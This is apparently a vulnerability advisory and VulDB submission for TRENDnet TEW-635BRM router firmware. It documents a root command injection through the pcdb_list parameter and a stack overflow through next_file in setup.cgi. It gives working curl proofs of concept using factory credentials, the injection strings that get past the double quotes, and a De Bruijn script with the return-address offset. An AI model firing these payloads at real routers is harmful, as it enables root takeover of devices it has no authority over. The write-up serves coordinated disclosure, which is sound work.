# [CVE-TBD] TRENDnet TEW-635BRM 1.00.1C OS Command Injection (CWE-78) ; Stack-based Buffer Overflow (CWE-121)

## VulDB Submission Fields

- Vendor: TRENDnet
- Product: TEW-635BRM
- Version or Commit: 1.00.1C
- Vulnerability: OS Command Injection (CWE-78) ; Stack-based Buffer Overflow (CWE-121)
- Advisory / Exploit URL: replace this with the URL of this directory after copying it to your public repository
- Description:

```
An OS command injection vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The edit action of /usr/sbin/setup.cgi (0x00409ac0), in its this_file=pc_dba.htm branch, passes the POST parameter pcdb_list without sanitization into sprintf(cmd, "/bin/echo \"ruleSelect123= %s \" >> /tmp/yiyi", pcdb_list) followed by system(cmd) in the root web-process context. The same root cause was previously disclosed for the sibling product TEW-657BRM as CVE-2026-5352; this submission documents the distinct affected product TEW-635BRM and the escape primitives that work in this quoted command context, which the public write-ups do not cover: because the injected text lands inside double quotes, semicolons are literalized and do not work, while command substitution (pcdb_list=Z$(/bin/ps>/tmp/e1)) and quote escape (pcdb_list=x";/bin/ps>/tmp/e2;") both execute, each verified dynamically (root-owned marker files with the ps output, and /tmp/yiyi showing the expanded substitution). An authenticated attacker executes arbitrary commands as root; factory credentials or chaining with the pre-authentication issues disclosed for this product remove the authentication barrier. Proposed CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8). Confirmed on TEW-635BRM A stack-based buffer overflow vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The edit action of /usr/sbin/setup.cgi (0x00409ac0), when handling this_file=fw_rules.htm, copies the attacker-controlled next_file POST parameter into a 20-byte stack buffer using an unbounded strcpy(). The stack frame is 592 bytes with the saved return address at sp+0x24c and the buffer at sp+0x18 (verified by manual disassembly), so the saved ra sits at payload offset 564; the branch additionally requires the out_sel parameter (otherwise atoi(NULL) crashes first and masks the overflow), and the function ends with html_parser(next_file) which returns immediately for names not containing ".htm". Reproduction: curl -u admin:password -X POST http://<router>/setup.cgi with todo=edit, this_file=fw_rules.htm, out_sel=1 and a 600-byte De Bruijn-pattern next_file produces SIGSEGV with epc=0x42414341 (big-endian bytes "BACA" at pattern offset 564, exactly the statically computed ra offset); length calibration shows 560 bytes do not crash while 568 bytes do. An authenticated attacker obtains PC control of a root CGI process; on production devices (Linux 2.6, no ASLR, no stack canaries) ROP-based code execution is realistic. This issue is distinct from the pcdb_list command injection in the same edit function (different branch, different parameter, different vulnerability class). Proposed CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8).
```

---

## Technical Disclosure

# Confirmed on TEW-635BRM: setup.cgi `edit` — `pcdb_list` OS Command Injection

> Original discovery (TEW-657BRM): **CVE-2026-5352** (published
> 2026-04-02) — "This impacts the function Edit of the file /setup.cgi.
> Such manipulation of the argument pcdb_list leads to os command
> injection." This document confirms the same root cause on TEW-635BRM
> v1.0R firmware V1.0(1.00.1C), and documents the escape primitives that
> work in this function's quoted command context.

## Affected Product

- Vendor: TRENDnet / Product: TEW-635BRM (v1.0R) / Firmware: V1.0(1.00.1C) (latest for v1.0R)
- Component: `/usr/sbin/setup.cgi` action `edit` (0x00409ac0), `this_file=pc_dba.htm` branch

## Root Cause

```c
// edit action, pc_dba.htm branch (setup.cgi):
char cmd[504];
sprintf(cmd, "/bin/echo \"ruleSelect123= %s \" >> /tmp/yiyi",
 find_val(req, "pcdb_list")); // no sanitization
system(cmd); // web process context (root)
```

Product-specific exploitation detail (TEW-635BRM): the injected text
lands **inside double quotes**, so `;` separators are literalized and do
NOT work. Working primitives, both verified dynamically:

1. command substitution: `pcdb_list=Z$(/bin/ps>/tmp/e1)`
2. quote escape: `pcdb_list=x";/bin/ps>/tmp/e2;"`

(The same `sprintf` is also unbounded for the 504-byte stack buffer — an
additional overflow surface, tracked separately from the injection.)

## Proof of Concept (non-destructive)

```bash
curl -s -u admin:password -X POST http://<ROUTER_IP>/setup.cgi \
 --data-urlencode "todo=edit" \
 --data-urlencode "this_file=pc_dba.htm" \
 --data-urlencode 'pcdb_list=Z$(/bin/ps>/tmp/e1)'
```

Observed on the rehosted firmware: HTTP 200; `/tmp/yiyi` contains
`ruleSelect123= Z ` (the `$(...)` was expanded — i.e. executed), and
`/tmp/e1` exists (owned by root) containing the `/bin/ps` output. The
quote-escape variant creates `/tmp/e2` equivalently. Control requests
with a plain numeric `pcdb_list` only append the literal line to
`/tmp/yiyi`.

## Impact

Authenticated OS command injection in the root web-process context;
effectively unauthenticated with factory credentials or chained with the
pre-authentication issues in this package.

## Proposed CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Verification

- Date: 2026-10-12 — confirmed on TEW-635BRM V1.0(1.00.1C) (rehosted firmware), both escape primitives

# CVE-TBD: TRENDnet TEW-635BRM setup.cgi `edit` Action (fw_rules.htm Branch) — `next_file` Stack-Based Buffer Overflow (PC Control Verified)

## Affected Product

- Vendor: TRENDnet
- Product: TEW-635BRM (hardware revision v1.0R)
- Firmware: V1.0(1.00.1C) — latest version available for this hardware revision (published 2010-06-18 on downloads.trendnet.com)
- Component: `/usr/sbin/setup.cgi` (web management CGI), action `edit`

## Summary

The `edit` action of `setup.cgi`, when handling `this_file=fw_rules.htm`,
copies the attacker-controlled `next_file` POST parameter into a
**20-byte stack buffer** using an unbounded `strcpy()`. An authenticated
attacker can overwrite the saved return address and hijack the program
counter — verified dynamically with a De Bruijn pattern
(`epc = 0x42414341`, pattern offset 564, matching the statically
determined stack layout exactly). This issue is distinct from the
command injection in the same `edit` function's `pc_dba.htm` branch
(different parameter, different branch, different vulnerability class;
see the cross-product confirmation entry for `pcdb_list`).

## Vulnerability Type / CWE

- CWE-121: Stack-based Buffer Overflow

## Root Cause

Decompiled `edit` (setup.cgi, 0x00409ac0):

```c
char local_buf[20]; // 1 byte + memset(19)
if (strcmp(find_val(req, "this_file"), "fw_rules.htm") == 0) {
 strcpy(local_buf, find_val(req, "next_file")); // ← unbounded
 ...
}
```

Stack-frame facts (verified by manual disassembly of the prologue —
decompiler variable naming is misleading here):

- frame size 592 bytes; `sw ra, 0x24c(sp)`; vulnerable buffer destination
 is `sp+0x18` (`addiu a0,sp,24` at the `strcpy` call site)
- distance from buffer start to saved `ra`: 0x24c − 0x18 = **564 bytes**;
 full `ra` overwrite therefore requires ≥ 568 payload bytes
- the branch afterwards reads `out_sel` (or `in_sel` on the rule_in.htm
 path): if that parameter is absent, `atoi(NULL)` crashes first and
 masks the overflow — a valid `out_sel` is required to reach the
 vulnerable return
- the function ends with `html_parser(local_buf, ...)`; a filename not
 containing `.htm` makes `html_parser` return immediately, after which
 the corrupted `ra` is consumed

## Proof of Concept (non-destructive)

```bash
# 600-byte De Bruijn pattern as next_file
python3 - <<'PY' > nf.txt
def db(n):
 a=[0]*64; out=[]
 def f(t,p):
 if t>4:
 if 4%p==0: out.extend(a[1:p+1])
 else:
 a[t]=a[t-p]; f(t+1,p)
 for j in range(a[t-p]+1,4):
 a[t]=j; f(t+1,t)
 f(1,1)
 s=''.join('ABCD'[i] for i in out)
 while len(s)<n: s+=s
 return s[:n]
print(db(1200))
PY
SEQ=$(cat nf.txt)
curl -s -u admin:password -X POST http://<ROUTER_IP>/setup.cgi \
 --data-urlencode "todo=edit" \
 --data-urlencode "this_file=fw_rules.htm" \
 --data-urlencode "out_sel=1" \
 --data-urlencode "next_file=${SEQ:0:600}"
```

Observed on the rehosted firmware (kernel log):

```
do_page_fault(): sending SIGSEGV to setup.cgi for invalid read access from 42414340
epc = 42414341 in libc.so.0[...]
```

On this big-endian MIPS target `0x42414341` corresponds to the pattern
bytes "BACA" at **payload offset 564** — exactly the statically computed
`ra` offset. Length calibration: 560-byte payload → no crash; 568-byte
payload → crash, matching 564 (offset of `ra`) + 4 (register width).
The CGI child dies without producing output (empty reply); the web server
itself survives and continues to serve requests.

## Impact

- Authenticated control-flow hijack of a root CGI process; production
 devices (Linux 2.6, no ASLR, no stack canaries) permit ROP-based code
 execution.
- Repeatable denial of service of the management CGI otherwise.
- Chaining note: factory credentials (`admin:password`) and the
 pre-authentication issues documented in this package make the
 authentication requirement weak in practice.

## Proposed CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Discovery

- Date: 2026-10-12
- Method: firmware rehosting (QEMU full-system emulation) + static reverse engineering (Ghidra) + manual disassembly of the stack frame + dynamic De Bruijn verification

## Timeline

- 2026-10-12: Vulnerability discovered (static), frame layout verified by disassembly, PC control verified dynamically
- 2026-10-13: Vendor notification sent
- TBD: CVE ID assignment
- TBD: Public disclosure

## Proof of Concept

See the poc file(s) in this directory.
